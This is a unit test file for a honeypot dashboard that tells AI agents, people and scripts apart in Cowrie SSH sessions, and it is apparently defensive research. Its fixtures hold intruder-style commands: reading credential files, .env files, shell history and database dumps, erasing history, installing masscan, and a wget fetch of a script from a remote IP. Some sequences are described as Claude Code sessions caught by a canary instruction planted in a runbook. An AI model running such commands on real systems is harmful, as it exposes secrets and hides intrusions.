"""dashboard/server.py: telling AI agents apart from people and scripts in SSH sessions."""
import os
import sys
import unittest
import unittest.mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "dashboard"))
import server  # noqa: E402

T = 1_800_000_000_000
IP = "45.155.205.10"


def session(client, commands, gaps_s):
    """A Cowrie session: login, then one command after each gap (seconds)."""
    evs = [{"eventid": "cowrie.session.connect", "t": T, "src_ip": IP, "protocol": "ssh"},
           {"eventid": "cowrie.client.version", "t": T + 1, "version": client},
           {"eventid": "cowrie.login.success", "t": T + 1000, "username": "root", "password": "root"}]
    t = T + 1000
    for cmd, gap in zip(commands, gaps_s):
        t += int(gap * 1000)
        evs.append({"eventid": "cowrie.command.input", "t": t, "input": cmd})
    return server.make_cowrie("s1", evs)


class AgentScoring(unittest.TestCase):
    EXPLORE = ["id", "uname -a", "cat /etc/os-release", "ls -la /root", "df -h", "ps aux"]

    # what the test agent of tools/agent_eval.py typed: it opens things it has just seen in a listing
    AGENT = ["ls -la /etc", "ls -la /etc/credstore", "ls -la /root", "cat /root/.bash_history",
             "cat /root/RUNBOOK.md", "ls -la /etc/nb-ops", "cat /etc/nb-ops/monitor.env", "ps auxww"]

    def test_following_up_on_listings_at_a_steady_pace_is_an_agent(self):
        x = session("SSH-2.0-paramiko_3.4.0", self.AGENT, [3.9, 2.6, 2.9, 2.1, 2.4, 2.5, 2.0, 3.4])
        self.assertEqual(x["cls"], "agent_suspected")
        self.assertTrue(any("Followed up" in r for r in x["reasons"]))

    # what Claude Code sent through the bridge: long chains with section headers, uneven thinking time
    TOOL = ["id; uname -a; hostname; pwd",
            "cat /etc/motd 2>/dev/null; echo '--- services ---'; systemctl list-units --type=service",
            "ls -la /etc/nginx/sites-enabled/ 2>/dev/null; echo '=== configs ==='; ls -la /var/www/app/",
            "cat /var/www/app/.env; echo '=== composer ==='; cat /var/www/app/composer.json",
            "echo '=== backup script ==='; cat /usr/local/bin/app-backup.sh; ls -la /srv/dumps",
            "echo '=== dumps ==='; head -c 300 /srv/dumps/full-2026.sql"]
    TOOL_GAPS = [4, 31, 6, 9, 48, 7]

    def test_agent_tool_with_uneven_pauses_is_an_agent(self):
        x = session("SSH-2.0-paramiko_4.0.0", self.TOOL, self.TOOL_GAPS)
        self.assertEqual(x["cls"], "agent_suspected")
        self.assertTrue(any("the way AI models write" in r for r in x["reasons"]))

    def test_the_same_commands_from_a_desktop_terminal_stay_a_person(self):
        x = session("SSH-2.0-PuTTY_Release_0.85", self.TOOL, self.TOOL_GAPS)
        self.assertEqual(x["cls"], "human_like")

    def test_one_follow_up_with_two_model_habits_is_an_agent(self):
        # the second Claude Code run: it learned most paths from file contents, so only one listing follow-up
        cmds = ["uname -a; echo '---'; id; echo '---'; uptime",
                "systemctl list-units --type=service --no-pager; echo '--- LISTENING ---'; ss -tulpn 2>/dev/null",
                "ls -la /var/backups/app/ 2>/dev/null; echo '=== root dir ==='; ls -la /root/ 2>/dev/null",
                "echo '=== notes ==='; cat /root/HANDOVER.md; echo '=== history ==='; cat /root/.bash_history",
                "echo '=== cron ==='; cat /etc/cron.d/app-backup 2>/dev/null; ls -la /usr/local/bin/app-backup.sh"]
        x = session("SSH-2.0-paramiko_4.0.0", cmds, [5, 22, 8, 41, 10])
        self.assertEqual(x["cls"], "agent_suspected")

    def test_one_follow_up_alone_is_not_an_agent(self):
        cmds = ["id", "uname -a", "ls -la /opt/app", "cat /opt/app/config.yml", "df -h", "ps aux"]
        x = session("SSH-2.0-paramiko_4.0.0", cmds, [5, 22, 8, 41, 10, 3])
        self.assertNotEqual(x["cls"], "agent_suspected")

    def test_model_style_without_follow_ups_is_not_an_agent(self):
        cmds = ["id; uname -a", "echo '=== disk ==='; df -h 2>/dev/null", "echo '=== mem ==='; free -m",
                "echo '=== net ==='; ip a 2>/dev/null", "echo '=== users ==='; w", "ps aux"]
        x = session("SSH-2.0-paramiko_4.0.0", cmds, [6.8, 8.7, 2.6, 10.9, 1.7, 2.6])
        self.assertNotEqual(x["cls"], "agent_suspected")

    def test_following_the_change_control_rule_is_the_canary(self):
        tok = server.IDENT["tokens"]["runbook"]
        x = session("SSH-2.0-paramiko_4.0.0",
                    ["cat /root/RUNBOOK.md", f'logger -t ops "CHG-{tok} Claude - looking for the cause of failing backups"',
                     "df -h"], [4, 9, 3])
        self.assertEqual(x["cls"], "agent_confirmed")
        self.assertTrue(any("change-control rule" in r for r in x["reasons"]))

    def test_a_change_number_from_the_history_is_not_the_canary(self):
        # root's history shows staff logging their own sessions; replaying one of those lines proves nothing
        x = session("SSH-2.0-paramiko_4.0.0",
                    ["cat /root/.bash_history", 'logger -t ops "CHG-0412 k.nowak - cert renewal intranet"', "df -h"],
                    [4, 9, 3])
        self.assertNotEqual(x["cls"], "agent_confirmed")

    def test_script_with_random_sleeps_is_not_an_agent(self):
        # paced and varied, but nothing it asks for came from an earlier listing
        x = session("SSH-2.0-paramiko_3.4.0", self.EXPLORE + ["ls /var/www", "cat /root/.bash_history"],
                    [6.8, 8.7, 2.6, 10.9, 1.7, 2.6, 15.4, 8.5])
        self.assertEqual(x["cls"], "unknown")
        self.assertTrue(any("never followed up" in r for r in x["reasons"]))

    def test_script_with_a_fixed_sleep_is_a_script(self):
        x = session("SSH-2.0-paramiko_3.4.0", self.EXPLORE + ["w", "free -m"],
                    [7.7, 5.4, 5.41, 5.39, 5.4, 5.42, 5.4, 5.4])
        self.assertEqual(x["cls"], "script")
        self.assertTrue(any("Clockwork" in r for r in x["reasons"]))

    def test_follow_ups_ignore_stock_names_and_urls(self):
        self.assertEqual(server.follow_ups(["ls -la /root", "cat /root/.bash_history", "ls /root/.ssh",
                                            "wget http://198.51.100.7/root/x.sh"]), [])
        self.assertEqual(server.follow_ups(["cat /opt/app/config.yml", "ls /opt/app"]), [])   # asked before looking
        self.assertEqual(server.follow_ups(["cd /opt/app && ls", "cat /opt/app/config.yml"]), ["/opt/app/config.yml"])

    def test_pasting_into_putty_is_a_person(self):
        cmds = ["\x1b[200~unset HISTFILE; export HISTSIZE=0", "w", "uname -a", "cat /proc/cpuinfo",
                "[200~apt install make[201~", "y"]
        x = session("SSH-2.0-PuTTY_Release_0.85", cmds, [12, 2, 3, 6, 16, 4])
        self.assertEqual(x["cls"], "human_like")
        self.assertTrue(any("PuTTY" in r for r in x["reasons"]))

    def test_paste_markers_alone_are_a_person(self):
        cmds = ["\x1b[200~id\x1b[201~", "uname -a", "ls /root", "cat /etc/passwd"]
        x = session("SSH-2.0-OpenSSH_9.6", cmds, [6, 6, 6.5, 6])
        self.assertEqual(x["cls"], "human_like")

    def test_waiting_for_installs_is_not_thinking(self):
        cmds = ["cat /proc/mounts", "apt update", "apt-get install libpcap-dev -y", "apt-get install libpcap-dev -y",
                "apt-get install masscan -y", "history -c && history -w"]
        x = session("SSH-2.0-Renci.SshNet.SshClient.0.0.1", cmds, [1.7, 4.1, 28, 25, 25, 16])
        self.assertNotEqual(x["cls"], "agent_suspected")
        self.assertTrue(any("slow commands" in r for r in x["reasons"]))


class RepeatedBackendEvents(unittest.TestCase):
    """Malware loops: identical commands are kept REPEAT_KEEP times per login, the rest only counted."""

    def test_repeats_are_folded_and_still_counted(self):
        seen, kept = {}, []
        for i in range(500):
            e = {"type": "exec", "t": T + i, "exe": "/usr/bin/bash", "argv": ["/bin/bash", "-c", "printf OK"]}
            if not server.fold_repeat(seen, e, "77:1"):
                kept.append(e)
        self.assertEqual(len(kept), server.REPEAT_KEEP)
        self.assertEqual(sum(server.n_times(e) for e in kept), 500)
        self.assertEqual(kept[-1]["_until"], T + 499)
        self.assertIn("480 more times", server.more_note(kept[-1])[0])

    def test_different_commands_logins_and_files_are_never_folded(self):
        seen = {}
        for i in range(100):
            self.assertFalse(server.fold_repeat(seen, {"type": "exec", "t": T, "exe": "/bin/ls", "argv": ["ls", str(i)]}, "1:1"))
            self.assertFalse(server.fold_repeat(seen, {"type": "exec", "t": T, "exe": "/bin/id", "argv": ["id"]}, f"{i}:1"))
            self.assertFalse(server.fold_repeat(seen, {"type": "file", "t": T, "path": "/tmp/x", "sha256": "a" * 64}, "1:1"))


class LessInMemory(unittest.TestCase):
    def test_decoy_connect_and_close_lines_are_dropped_after_the_first_few(self):
        st, kept = {}, []
        for i in range(1000):
            for ev in ("connect", "ntlm", "close"):
                e = {"ip": IP, "svc": "rdp", "event": ev, "t": T + i * 1000}
                if not server.quiet_decoy(st, e):
                    kept.append(ev)
        self.assertEqual(kept.count("ntlm"), 1000)                       # every login attempt stays
        self.assertEqual(kept.count("connect") + kept.count("close"), server.DECOY_QUIET_KEEP)

    def test_a_new_visit_starts_the_count_again(self):
        st = {}
        for i in range(100):
            server.quiet_decoy(st, {"ip": IP, "svc": "smb", "event": "connect", "t": T + i})
        later = T + server.WEB_SESSION_GAP_MS + 5000
        self.assertFalse(server.quiet_decoy(st, {"ip": IP, "svc": "smb", "event": "connect", "t": later}))
        self.assertFalse(server.quiet_decoy(st, {"ip": "45.155.205.11", "svc": "smb", "event": "connect", "t": T}))

    def test_only_recent_log_files_are_loaded(self):
        import tempfile
        with tempfile.NamedTemporaryFile(delete=False) as f:
            path = f.name
        self.addCleanup(os.unlink, path)
        now = os.path.getmtime(path)
        with unittest.mock.patch.dict(server.CFG, {"history_days": 7}):
            self.assertTrue(server.recent_file(path, now + 6 * 86400))
            self.assertFalse(server.recent_file(path, now + 8 * 86400))
        self.assertFalse(server.recent_file(path + ".missing"))


if __name__ == "__main__":
    unittest.main()
